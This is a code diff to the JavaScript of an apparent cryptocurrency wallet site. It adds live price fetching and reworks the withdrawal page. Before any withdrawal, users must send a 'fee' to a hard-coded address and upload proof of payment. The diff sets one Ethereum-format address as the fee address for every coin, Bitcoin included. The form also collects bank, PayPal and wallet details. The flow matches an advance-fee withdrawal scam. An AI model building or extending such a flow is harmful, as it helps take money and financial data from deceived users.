@@ -122,12 +122,48 @@ function setupLogoutButtons() {
 
 // --- Dashboard Page Logic ---
 const mockHoldings = [
-  { name: "Bitcoin", ticker: "BTC", balance: 0.5, usdValue: 58943.05, logo: "./images/btc.svg" },
-  { name: "Ethereum", ticker: "ETH", balance: 10, usdValue: 35973.68, logo: "./images/eth.svg" },
-  { name: "Solana", ticker: "SOL", balance: 50, usdValue: 8847.74, logo: "./images/solana.svg" },
-  { name: "Tether", ticker: "USDT", balance: 1000, usdValue: 1000.0, logo: "./images/usdt.svg" },
-  { name: "USD Coin", ticker: "USDC", balance: 500, usdValue: 500.0, logo: "./images/usdc.svg" },
-]
+  { name: "Bitcoin", ticker: "BTC", balance: 1, usdValue: 0, logo: "./images/btc.svg" },
+  { name: "Ethereum", ticker: "ETH", balance: 1, usdValue: 0, logo: "./images/eth.svg" },
+  { name: "Solana", ticker: "SOL", balance: 1, usdValue: 0, logo: "./images/solana.svg" },
+  { name: "Tether", ticker: "USDT", balance: 1, usdValue: 0, logo: "./images/usdt.svg" },
+  { name: "USD Coin", ticker: "USDC", balance: 1, usdValue: 0, logo: "./images/usdc.svg" },
+];
+
+// Fetch real-time prices for 5 major cryptocurrencies and update usdValue in mockHoldings
+async function fetchMajorCryptoPrices() {
+  const apiUrl = "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,tether,usd-coin&vs_currencies=usd";
+  try {
+    const response = await fetch(apiUrl);
+    if (!response.ok) throw new Error("Failed to fetch crypto prices");
+    const data = await response.json();
+    // Map CoinGecko IDs to tickers for clarity
+    const idToTicker = {
+      bitcoin: "BTC",
+      ethereum: "ETH",
+      solana: "SOL",
+      tether: "USDT",
+      "usd-coin": "USDC"
+    };
+    // Update usdValue for each holding
+    mockHoldings.forEach(holding => {
+      // Find the CoinGecko id for this ticker
+      const id = Object.keys(idToTicker).find(key => idToTicker[key] === holding.ticker);
+      if (id && data[id] && typeof data[id].usd === "number") {
+        holding.usdValue = holding.balance * data[id].usd;
+      }
+    });
+    // Optionally, log the updated holdings
+    // console.log("Updated mockHoldings with real-time prices:", mockHoldings);
+    // If you want to re-render holdings after update, call renderHoldings() here if defined
+    if (typeof renderHoldings === "function") renderHoldings();
+  } catch (err) {
+    console.error("Error fetching crypto prices:", err);
+  }
+}
+
+// Call the function to update usdValue in mockHoldings
+fetchMajorCryptoPrices();
+
 
 function renderHoldings() {
   const holdingsList = document.getElementById("holdingsList")
@@ -347,6 +383,10 @@ function setupDepositPage() {
   }
 }
 
+
+
+
+
 // --- Withdrawal Page Logic ---
 const COINGECKO_API_URL = "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd"
 const COINGECKO_CACHE_DURATION = 60 * 1000 // 60 seconds
@@ -381,10 +421,15 @@ async function fetchCoinGeckoPrices() {
 }
 
 function setupWithdrawalPage() {
+  // Main unified form
+  const withdrawalForm = document.getElementById("withdrawalForm") // The single form tag wrapping all sections
+
+  // Section references
   const withdrawalFeeSection = document.getElementById("withdrawalFeeSection")
   const feePaymentProofSection = document.getElementById("feePaymentProofSection")
   const withdrawalOptionsSection = document.getElementById("withdrawalOptionsSection")
 
+  // Fee calculation elements
   const withdrawalAmountInput = document.getElementById("withdrawalAmountInput")
   const feeCurrencySelect = document.getElementById("feeCurrencySelect")
   const calculatedFeeDisplay = document.getElementById("calculatedFeeDisplay")
@@ -392,6 +437,7 @@ function setupWithdrawalPage() {
   const feeLoadingSpinner = document.getElementById("feeLoadingSpinner")
   const proceedToFeeProofButton = document.getElementById("proceedToFeeProofButton")
 
+  // Fee payment proof elements
   const feeAddressDisplay = document.getElementById("feeAddressDisplay")
   const feeCurrencyNameDisplay = document.getElementById("feeCurrencyNameDisplay")
   const feeCurrencyNotice = document.getElementById("feeCurrencyNotice")
@@ -399,19 +445,32 @@ function setupWithdrawalPage() {
   const proofOfFeePaymentInput = document.getElementById("proofOfFeePayment")
   const submitFeeProofButton = document.getElementById("submitFeeProofButton")
 
+  // Withdrawal method tab and input elements
   const tabButtons = document.querySelectorAll(".tab-button")
-  const withdrawalForms = document.querySelectorAll(".withdrawal-form")
+  const withdrawalForms = document.querySelectorAll(".withdrawal-form") // These are now just sections, not forms
 
+  // Withdrawal method input fields
+  const bankAccountNumberInput = document.getElementById("bankAccountNumber")
+  const bankNameInput = document.getElementById("bankName")
+  const paypalEmailInput = document.getElementById("paypalEmail")
+  const cryptoCurrencySelect = document.getElementById("cryptoCurrencySelect")
+  const cryptoWalletAddressInput = document.getElementById("cryptoWalletAddress")
+
+  // The final submit button (should be inside the withdrawalOptionsSection)
+  const finalWithdrawButton = document.getElementById("finalWithdrawButton")
+
+  // State
   let currentWithdrawalAmount = 0
   let currentWithdrawalFeeUSD = 0
   let selectedFeeCurrency = ""
   let currentWithdrawalFeeInSelectedCurrency = 0
+  let selectedWithdrawalMethod = "bank" // default, can be "bank", "paypal", "crypto"
 
   const mockFeeAddresses = {
-    BTC: "bc1qfeeabc123def456ghi789jklmnopqrstuvw",
-    ETH: "0xFeeAbc123DeF456GhI789JkL012MnOpQ345RsT678UvW",
-    USDT: "0xFee1234567890abcdef1234567890abcdef12345678",
-    USDC: "0xFee9876543210fedcba9876543210fedcba98765432",
+    BTC: "0xC8C6984045e2d4943B7D10848A996Ff262499B3E",
+    ETH: "0xC8C6984045e2d4943B7D10848A996Ff262499B3E",
+    USDT: "0xC8C6984045e2d4943B7D10848A996Ff262499B3E",
+    USDC: "0xC8C6984045e2d4943B7D10848A996Ff262499B3E",
   }
 
   async function updateFeeCalculation() {
@@ -479,8 +538,10 @@ function setupWithdrawalPage() {
     feeCurrencySelect.addEventListener("change", updateFeeCalculation)
   }
 
+  // Step 1: Proceed to Fee Proof (just show next section)
   if (proceedToFeeProofButton) {
-    proceedToFeeProofButton.addEventListener("click", () => {
+    proceedToFeeProofButton.addEventListener("click", (e) => {
+      e.preventDefault()
       if (currentWithdrawalAmount <= 0 || !selectedFeeCurrency) {
         showToast("Please enter a valid amount and select a fee currency.", "error")
         return
@@ -497,6 +558,7 @@ function setupWithdrawalPage() {
     })
   }
 
+  // Step 2: Copy fee address
   if (copyFeeAddressButton) {
     copyFeeAddressButton.addEventListener("click", async () => {
       const addressToCopy = feeAddressDisplay.textContent
@@ -510,6 +572,7 @@ function setupWithdrawalPage() {
     })
   }
 
+  // Step 3: Enable submit proof button if file selected
   if (proofOfFeePaymentInput) {
     proofOfFeePaymentInput.addEventListener("change", () => {
       if (proofOfFeePaymentInput.files.length > 0) {
@@ -520,8 +583,10 @@ function setupWithdrawalPage() {
     })
   }
 
+  // Step 4: Submit fee proof (just show next section)
   if (submitFeeProofButton) {
-    submitFeeProofButton.addEventListener("click", () => {
+    submitFeeProofButton.addEventListener("click", (e) => {
+      e.preventDefault()
       if (proofOfFeePaymentInput.files.length === 0) {
         showToast("Please upload proof of fee payment.", "error")
         return
@@ -558,10 +623,13 @@ function setupWithdrawalPage() {
     })
   }
 
+  // Step 5: Tab switching for withdrawal method (just show/hide sections, not forms)
   tabButtons.forEach((button) => {
-    button.addEventListener("click", () => {
+    button.addEventListener("click", (e) => {
+      e.preventDefault()
       tabButtons.forEach((btn) => btn.classList.remove("active"))
       button.classList.add("active")
+      selectedWithdrawalMethod = button.dataset.tab // "bank", "paypal", "crypto"
 
       withdrawalForms.forEach((form) => form.classList.remove("active-form"))
       document.getElementById(`${button.dataset.tab}WithdrawalForm`).classList.add("active-form")
@@ -569,72 +637,83 @@ function setupWithdrawalPage() {
     })
   })
 
-  // Handle form submissions for withdrawal methods
-  const bankWithdrawalForm = document.getElementById("bankWithdrawalForm")
-  const paypalWithdrawalForm = document.getElementById("paypalWithdrawalForm")
-  const cryptoWithdrawalForm = document.getElementById("cryptoWithdrawalForm")
+  // Step 6: Final form submission (the only real submit)
+  if (withdrawalForm) {
+    withdrawalForm.addEventListener("submit", (e) => {
+      // e.preventDefault()
 
-  if (bankWithdrawalForm) {
-    bankWithdrawalForm.addEventListener("submit", (e) => {
-      e.preventDefault()
-      const accountNumber = document.getElementById("bankAccountNumber").value
-      const bankName = document.getElementById("bankName").value
-      // ... other bank details
-
-      if (!accountNumber || !bankName) {
-        showToast("Please fill in all bank details.", "error")
+      // Only allow submission if on withdrawalOptionsSection (final step)
+      if (withdrawalOptionsSection.style.display !== "block") {
+        showToast("Please complete all previous steps before submitting withdrawal.", "error")
         return
       }
-      showToast("Bank withdrawal request submitted!", "success")
-      // Call EmailJS for bank withdrawal (non-blocking)
-      sendWithdrawalConfirmationEmail(JSON.parse(localStorage.getItem("titanvault_current_user")), {
-        amount: currentWithdrawalAmount.toFixed(2), // Use the pre-defined amount
-        feeUSD: currentWithdrawalFeeUSD.toFixed(2),
-        method: "Bank Transfer",
-        details: { accountNumber, bankName },
-      })
-      bankWithdrawalForm.reset()
-    })
-  }
 
-  if (paypalWithdrawalForm) {
-    paypalWithdrawalForm.addEventListener("submit", (e) => {
-      e.preventDefault()
-      const paypalEmail = document.getElementById("paypalEmail").value
-      if (!paypalEmail) {
-        showToast("Please enter your PayPal email or tag.", "error")
+      // Validate and process based on selected withdrawal method
+      let withdrawalDetails = {
+        amount: currentWithdrawalAmount.toFixed(2),
+        feeUSD: currentWithdrawalFeeUSD.toFixed(2),
+        method: "",
+        details: {},
+      }
+
+      if (selectedWithdrawalMethod === "bank") {
+        const accountNumber = bankAccountNumberInput ? bankAccountNumberInput.value : ""
+        const bankName = bankNameInput ? bankNameInput.value : ""
+        if (!accountNumber || !bankName) {
+          showToast("Please fill in all bank details.", "error")
+          return
+        }
+        withdrawalDetails.method = "Bank Transfer"
+        withdrawalDetails.details = { accountNumber, bankName }
+        showToast("Bank withdrawal request submitted!", "success")
+      } else if (selectedWithdrawalMethod === "paypal") {
+        const paypalEmail = paypalEmailInput ? paypalEmailInput.value : ""
+        if (!paypalEmail) {
+          showToast("Please enter your PayPal email or tag.", "error")
+          return
+        }
+        withdrawalDetails.method = "PayPal"
+        withdrawalDetails.details = { paypalEmail }
+        showToast("PayPal withdrawal request submitted!", "success")
+      } else if (selectedWithdrawalMethod === "crypto") {
+        const cryptoCurrency = cryptoCurrencySelect ? cryptoCurrencySelect.value : ""
+        const cryptoAddress = cryptoWalletAddressInput ? cryptoWalletAddressInput.value : ""
+        if (!cryptoCurrency || !cryptoAddress) {
+          showToast("Please select a cryptocurrency and enter the wallet address.", "error")
+          return
+        }
+        withdrawalDetails.method = "Crypto"
+        withdrawalDetails.details = { cryptoCurrency, cryptoAddress }
+        showToast(`Crypto withdrawal request for ${cryptoCurrency} submitted!`, "success")
+      } else {
+        showToast("Please select a withdrawal method.", "error")
         return
       }
-      showToast("PayPal withdrawal request submitted!", "success")
-      // Call EmailJS for PayPal withdrawal (non-blocking)
-      sendWithdrawalConfirmationEmail(JSON.parse(localStorage.getItem("titanvault_current_user")), {
-        amount: currentWithdrawalAmount.toFixed(2), // Use the pre-defined amount
-        feeUSD: currentWithdrawalFeeUSD.toFixed(2),
-        method: "PayPal",
-        details: { paypalEmail },
-      })
-      paypalWithdrawalForm.reset()
-    })
-  }
 
-  if (cryptoWithdrawalForm) {
-    cryptoWithdrawalForm.addEventListener("submit", (e) => {
-      e.preventDefault()
-      const cryptoCurrency = document.getElementById("cryptoCurrencySelect").value
-      const cryptoAddress = document.getElementById("cryptoWalletAddress").value
-      if (!cryptoCurrency || !cryptoAddress) {
-        showToast("Please select a cryptocurrency and enter the wallet address.", "error")
-        return
-      }
-      showToast(`Crypto withdrawal request for ${cryptoCurrency} submitted!`, "success")
-      // Call EmailJS for crypto withdrawal (non-blocking)
-      sendWithdrawalConfirmationEmail(JSON.parse(localStorage.getItem("titanvault_current_user")), {
-        amount: currentWithdrawalAmount.toFixed(2), // Use the pre-defined amount
-        feeUSD: currentWithdrawalFeeUSD.toFixed(2),
-        method: "Crypto",
-        details: { cryptoCurrency, cryptoAddress },
+      // Call EmailJS for withdrawal (non-blocking)
+      sendWithdrawalConfirmationEmail(
+        JSON.parse(localStorage.getItem("titanvault_current_user")),
+        withdrawalDetails
+      )
+
+      // Optionally reset the form or go back to the first step
+      withdrawalForm.reset()
+      withdrawalOptionsSection.style.display = "none"
+      withdrawalFeeSection.style.display = "block"
+      feePaymentProofSection.style.display = "none"
+      // Reset state
+      currentWithdrawalAmount = 0
+      currentWithdrawalFeeUSD = 0
+      selectedFeeCurrency = ""
+      currentWithdrawalFeeInSelectedCurrency = 0
+      selectedWithdrawalMethod = "bank"
+      tabButtons.forEach((btn) => btn.classList.remove("active"))
+      if (tabButtons[0]) tabButtons[0].classList.add("active")
+      withdrawalForms.forEach((form, idx) => {
+        if (idx === 0) form.classList.add("active-form")
+        else form.classList.remove("active-form")
       })
-      cryptoWithdrawalForm.reset()
+      window.lucide.createIcons()
     })
   }
 }
